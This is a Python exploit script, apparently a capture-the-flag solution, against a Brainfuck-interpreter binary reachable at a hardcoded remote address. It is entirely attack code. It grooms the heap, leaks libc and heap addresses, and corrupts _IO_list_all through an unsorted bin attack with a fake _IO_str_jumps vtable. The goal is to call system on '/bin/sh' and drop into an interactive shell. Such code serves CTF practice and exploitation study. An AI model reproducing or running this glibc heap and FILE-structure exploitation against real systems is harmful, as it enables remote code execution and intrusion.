#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bfi.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}, 'aslr':False}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        remote  = {'host':'76.74.177.238', 'port':9003})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    bfi(conn, '.', 0x98, 0x98)
    bfi(conn, '.', 0x98, 0x98)
    bfi(conn, '.', 0x18, 0x98)
    bfi(conn, '.', 0x18, 0x18)
    bfi(conn, '.', 0x28, 0x28)
    bfi(conn, '.', 0x28, 0x28)

    # consolidate
    bfi(conn, '.', 0x18, 0x98)

    bfi(conn, ',>,<[.-]>.', 0x18, 0x28, '\x18\x33')
    # bfi(conn, ',>,>,<<[>.<-]>>.', 0x18, 0x28, '\x18\x00\x33')
    addr_libc_mainarena = u(bfi(conn, '[.>],>,<[.-]>.', 0x18, 0x28, '\x12\x31')[:6]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_io_list_all   = libc.symbols['_IO_list_all']
    addr_libc_io_str_jumps  = libc.address + 0x3e8360 # libc.symbols['_IO_str_jumps']
    addr_libc_one_gadget    = libc.address + 0x4f2c5
    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search('/bin/sh'))

    bfi(conn, '>', 0x28, 0x18)

    for _ in range(8):
        bfi(conn, '>', 0x18, 0x78)

    bfi(conn, ',>,<[.-]>.', 0x18, 0x38, '\x18\x33')
    addr_heap_base = u(bfi(conn, '[.>],>,<[.-]>.', 0x18, 0x28, '\x12\x81')[:6]) - 0x950
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    bfi(conn, '>', 0x58, 0x58)
    bfi(conn, '>', 0x58, 0x58)

    target = (addr_libc_str_sh - 0x64) / 2
    bfi(conn, '>'.ljust(0x18, '\x00')+p64(target + 1) + '\x00'*0x10 + p64(target), 0x58, 0x18)
    bfi(conn, '>'.ljust(0x8, '\x00') + p64(addr_libc_io_str_jumps) + p64(addr_libc_system), 0x48, 0x18)

    # consolidate
    bfi(conn, '>', 0x18, 0x98)
    bfi(conn, '>', 0x18, 0x28)
    bfi(conn, '>', 0x18, 0x98)

    exploit  = p64(0)*9
    exploit += p64(0x31)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_libc_io_list_all - 0x10)
    bfi(conn, '>'+exploit[1:], 0x78, 0x18)

    # unsorted bin attack
    bfi(conn, '>', 0x18, 0x28)
    conn.sendlineafter('code size = ', '0')

def bfi(conn, code, code_size, buf_size, data = None):
    conn.sendlineafter('code size = ', str(code_size))
    conn.sendlineafter('code = ', code)
    conn.sendlineafter('buffer size = ', str(buf_size))
    conn.sendlineafter('Running...\n', data if data is not None else '')
    return conn.recvuntil('\n[+] Done!', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
